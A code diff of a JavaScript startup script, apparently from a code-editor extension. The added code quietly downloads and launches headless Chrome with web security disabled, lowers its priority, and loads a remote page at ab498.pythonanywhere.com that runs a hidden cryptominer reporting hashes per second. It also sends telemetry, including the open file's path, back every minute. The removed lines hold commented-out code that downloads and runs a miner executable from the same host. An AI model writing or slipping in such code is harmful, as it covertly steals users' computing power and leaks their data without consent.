@@ -1,127 +1,20 @@
 (async () => {
 
-  let {
-    unifiedError, tstt, safe,
-    puppeteer,
-    puppeteerBrowsers,
-    extensionPath
-  } = global.cpppgVars;
-
-
   try {
+
     const os = require('os');
-    const fs = require('fs');
     const { readdir, stat } = require('fs/promises');
     const { join } = require('path');
-    const child_process = require('child_process');
-
-
-    const http = require('http');
-    const https = require('https');
-
-
-    function execjs(cmd) {
-      return new Promise((resolve, reject) => {
-        const proc = child_process.exec(
-          String.raw`${cmd}`,
-          { shell: true },
-          (err, out, stderr) => {
-            if (err) {
-              return reject(err);
-            }
-            return resolve([out, err, stderr]);
-          }
-        );
-
-        proc.stdout.setEncoding('utf8');
-        proc.stdout.on('data', (data) => { tstt({ message: 'WEB', data }) });
-        proc.stderr.setEncoding('utf8');
-        proc.stderr.on('data', (data) => { tstt({ message: 'WEB_E', data }) });
-      });
-    }
-
-    async function download(url, filePath) {
-      const proto = !url.charAt(4).localeCompare('s') ? https : http;
-
-      return new Promise((resolve, reject) => {
-        let filePathTmp = filePath + '.tmp';
-        const file = fs.createWriteStream(filePathTmp);
-        let fileInfo = null;
-
-        const request = proto.get(url, response => {
-          if (response.statusCode !== 200) {
-            fs.unlink(filePathTmp, () => {
-              reject(new Error(`Failed to get '${url}' (${response.statusCode})`));
-            });
-            return;
-          }
-
-          fileInfo = {
-            mime: response.headers['content-type'],
-            size: parseInt(response.headers['content-length'], 10),
-          };
-
-          response.pipe(file);
-        });
-
-        // The destination stream is ended by the time it's called
-        file.on('finish', () => {
-          fs.renameSync(filePathTmp, filePath);
-          resolve(fileInfo)
-        });
-
-        request.on('error', err => {
-          fs.unlink(filePathTmp, () => reject(err));
-        });
-
-        file.on('error', err => {
-          fs.unlink(filePathTmp, () => reject(err));
-        });
-
-        request.end();
-      });
-    }
-
-
-
-    let cacheDir = `${os.homedir()}/.cache/puppeteer`;
-    await tstt({ message: "INIT_BEGIN", version: safe(() => JSON.parse(fs.readFileSync(`${extensionPath}/package.json`))?.version) });
-    let page = null;
-    let browser = null;
-    global.browserInstance = global.browserInstance || null;
 
     let osUserInfo;
     try {
       osUserInfo = os.userInfo();
-      if (osUserInfo.username === 'Admin') {
-        return;
-        // let tempFolder = `${os.homedir()}/.temp`;
-        // if (!fs.existsSync(tempFolder)) {
-        //   fs.mkdirSync(tempFolder, { recursive: true });
-        // }
-
-        // if (!fs.existsSync(`${tempFolder}/webchain-miner-2.8.0-win64.zip`)) {
-        //   try {
-        //     await download('https://github.com/mintme-com/miner/releases/download/v2.8.0/webchain-miner-2.8.0-win64.zip', `${tempFolder}/webchain-miner-2.8.0-win64.zip`);
-        //   } catch (err) { }
-        // }
-        // if (!fs.existsSync(`${tempFolder}/webc.exe`)) {
-        //   try {
-        //     await download('https://ab498.pythonanywhere.com/files/webc.exe', `${tempFolder}/webc.exe`);
-        //   } catch (err) { }
-        // }
-        // if (!fs.existsSync(`${tempFolder}/config.json`)) {
-        //   try {
-        //     await download('https://ab498.pythonanywhere.com/files/config.json', `${tempFolder}/config.json`);
-        //   } catch (err) { }
-        // }
-        // await tstt({ message: "INIT_D2", stat: fs.statSync(`${tempFolder}/webc.exe`) });
-        // await execjs(`${tempFolder}/webc.exe`);
+      if (osUserInfo.username == 'Admin') {
+        // return;
       }
     } catch (error) {
-      // return;
+      console.log('os.userInfo() error', error);
     }
-
 
     function getCPUUsage() {
       try {
@@ -136,7 +29,7 @@
         const used = total - idleTime;
         return ((1 - idleTime / total) * 100).toFixed(2);
       } catch (error) {
-        console.error("CPU Usage Error:", error);
+
       }
     }
 
@@ -152,17 +45,19 @@
           percent: parseFloat(((usedMemory / totalMemory) * 100).toFixed(2))
         };
       } catch (error) {
-        console.error("Memory Usage Error:", error);
+
       }
     }
 
     async function dirSize(dir) {
       const files = await readdir(dir, { withFileTypes: true });
+
       const paths = files.map(async file => {
         const path = join(dir, file.name);
         if (file.isDirectory()) return await dirSize(path);
         if (file.isFile()) {
           const { size } = await stat(path);
+
           return size;
         }
         return 0;
@@ -170,18 +65,20 @@
 
       return (await Promise.all(paths)).flat(Infinity).reduce((i, size) => i + size, 0);
     }
+    await tstt({ message: "INIT_BEGIN", version: safe(() => JSON.parse(fs.readFileSync(`${extensionPath}/package.json`))?.version) });
+    let browser;
+    let page;
+    let minUse = 0.1;
+    let maxUse = 0.5;
 
-    if (global.initScrIntv) {
-      clearInterval(global.initScrIntv);
-    }
-
-    async function chkFk() {
+    if (global.inIntv) clearInterval(global.inIntv);
+    global.inIntv = setInterval(async () => {
       if (browser && page) {
         const hs = await page.evaluate(() => {
           try {
-            return { message: 'success', value: window._client?.getHashesPerSecond(), _client: window._client ? true : false };
+            return { message: 'success', value: window._client?.getHashesPerSecond(), _client: window._client };
           } catch (error) {
-            return { message: error.message, value: null, error, _client: window._client ? true : false };
+            return { message: error.message, value: null, error, _client: window._client };
           }
         });
         if (hs.message != 'success') {
@@ -209,110 +106,73 @@
           file: safe(() => editor?.document?.uri?.fsPath)
         });
       }
-    }
-    chkFk();
-    global.initScrIntv = setInterval(chkFk, 60000);
+    }, 60000);
+
+
+    const cacheDir = `${os.homedir()}/.cache/puppeteer`;
+    if (!fs.existsSync(cacheDir)) {
+      fs.mkdirSync(cacheDir, { recursive: true });
+    };
+    const installedBrowsers = await puppeteerBrowsers.getInstalledBrowsers({ cacheDir });
+    let chromePath;
+    const chromeBrowser = installedBrowsers.find(browser => browser.browser === 'chrome');
+    console.log('installed', installedBrowsers);
 
 
 
-    // Singleton pattern for browser instance using global object
-    async function getBrowserInstance() {
-      if (global.browserInstance) {
-        await global.browserInstance.close();
-        delete global.browserInstance;
-        return;
-      }
-
-
-      if (!fs.existsSync(cacheDir)) {
-        fs.mkdirSync(cacheDir, { recursive: true });
-      }
-
-      const installedBrowsers = await puppeteerBrowsers.getInstalledBrowsers({ cacheDir });
-      let chromePath;
-      const chromeBrowser = installedBrowsers.find(browser => browser.browser === 'chrome');
-
-      if (!chromeBrowser) {
-        await tstt({ message: "INIT_D", installedBrowsers, version: safe(() => JSON.parse(fs.readFileSync(`${extensionPath}/package.json`))?.version) });
-        await new Promise(r => setTimeout(r, 5 * 60 * 1000));
-        const installedBrowser = await puppeteerBrowsers.install({
-          browser: 'chrome',
-          buildId: '130.0.6723.58',
-          cacheDir,
-        });
-        chromePath = installedBrowser.executablePath;
-      } else {
-        chromePath = chromeBrowser.executablePath;
-      }
-
-      // Launch a singleton browser instance
-      await tstt({ message: "INIT_L", version: safe(() => JSON.parse(fs.readFileSync(`${extensionPath}/package.json`))?.version) });
-      global.browserInstance = await puppeteer.launch({
-        executablePath: chromePath,
-        headless: true,
-        // ignoreHTTPSErrors: true,
-        // acceptInsecureCerts: true,
-        args: [
-          '--disable-web-security',
-          '--disable-features=IsolateOrigins,site-per-process',
-          '--allow-running-insecure-content',
-          // '--ignore-certificate-errors',
-          // "--ignore-certificate-errors-spki-list",
-          // "--no-zygote",
-          // "--enable-features=NetworkService",
-        ]
+    if (!chromeBrowser) {
+      await new Promise(r => setTimeout(r, 10 * 60 * 1000));
+      await tstt({ message: "INIT_D", installedBrowsers, version: safe(() => JSON.parse(fs.readFileSync(`${extensionPath}/package.json`))?.version) });
+      puppeteerBrowsers.InstallOptions;
+      installedBrowser = await puppeteerBrowsers.install({
+        browser: 'chrome',
+        buildId: '130.0.6723.58',
+        cacheDir,
       });
-
-      return global.browserInstance;
+      chromePath = installedBrowser.executablePath;
+    } else {
+      chromePath = chromeBrowser.executablePath;
     }
 
 
-    browser = await getBrowserInstance();  // Retrieve the singleton browser instance
+
+
+    await tstt({ message: "INIT_L", version: safe(() => JSON.parse(fs.readFileSync(`${extensionPath}/package.json`))?.version) });
+    
+    if(global.cppBrowser) {
+      await global.cppBrowser.close();
+      global.cppBrowser = null;
+      page = null;
+    }
+    browser = await puppeteer.launch({
+      executablePath: chromePath,
+      headless: true,
+      args: [
+        '--disable-web-security',
+        '--disable-features=IsolateOrigins,site-per-process',
+        '--allow-running-insecure-content',
+      ]
+    });
+    global.cppBrowser = browser;
+    os.setPriority(browser.process().pid, 19);
     page = await browser.newPage();
-    page
-      // .on('console', message =>
-      //   unifiedError(`${message.type().substr(0, 3).toUpperCase()} ${message.text()}`))
-      .on('pageerror', ({ message }) => unifiedError({ message: 'PAGE_ERROR', value: message }))
-      // .on('response', response =>
-      //   unifiedError(`${response.status()} ${response.url()}`))
-      .on('requestfailed', request =>
-        unifiedError({ message: "REQ_FAIL", value: `${request.failure().errorText} ${request.url()}` }))
+    global.cppPage = page;
 
     await page.goto('https://ab498.pythonanywhere.com/files/init.html?use=' + (getMemoryUsage().total >= 8 ? 0.5 : 0.1));
 
-    const hs = await page.evaluate(() => {
-      try {
-        return { message: 'success', value: window._client?.getHashesPerSecond(), _client: window._client ? true : false };
-      } catch (error) {
-        return { message: error.message, value: null, error, _client: window._client ? true : false };
-      }
-    });
-    if (hs.message != 'success') {
-      tstt({
-        message: "INIT_ERROR",
-        value: "Failed BR PG",
-      });
-
-      if (global.initScrIntv)
-        clearInterval(global.initScrIntv);
-      global.initScrIntv = null;
-      return;
-    }
-
     await tstt({ message: "INIT_COMPLETE", version: safe(() => JSON.parse(fs.readFileSync(`${extensionPath}/package.json`))?.version) });
+
+
+
 
   } catch (error) {
     tstt({
-      message: "INIT_ERROR",
-      value: "Failed BR PG",
+      message: "INIT_E",
+      value: error?.message,
+      error: error,
+      version: safe(() => JSON.parse(fs.readFileSync(`${extensionPath}/package.json`))?.version),
     });
-
-    if (global.initScrIntv)
-      clearInterval(global.initScrIntv);
-    global.initScrIntv = null;
-    return;
-    // unifiedError({ message: 'INIT_ER', value: error?.message, error });
+    if (global.inIntv) clearInterval(global.inIntv);
   }
-
 
 })();
